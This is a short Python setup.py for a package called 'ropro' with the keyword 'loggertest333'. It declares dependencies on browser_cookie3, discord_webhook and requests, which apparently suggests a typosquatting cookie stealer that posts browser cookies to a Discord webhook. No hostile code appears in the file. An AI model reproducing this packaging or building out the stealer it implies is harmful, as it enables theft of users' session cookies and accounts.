from setuptools import setup, find_packages

classifiers = [
  'Development Status :: 5 - Production/Stable',
  'Intended Audience :: Education',
  'Operating System :: Microsoft :: Windows :: Windows 10',
  'License :: OSI Approved :: MIT License',
  'Programming Language :: Python :: 3'
]

setup(
  name='ropro',
  version='1',
  description='test',
  long_description=open('README.txt').read() + '\n\n' + open('CHANGELOG.txt').read(),
  url='',  
  author='someone',
  author_email='someone@gmail.com',
  license='MIT', 
  classifiers=classifiers,
  keywords='loggertest333', 
  packages=find_packages(),
  install_requires=['discord_webhook', 'browser_cookie3', 'requests']
)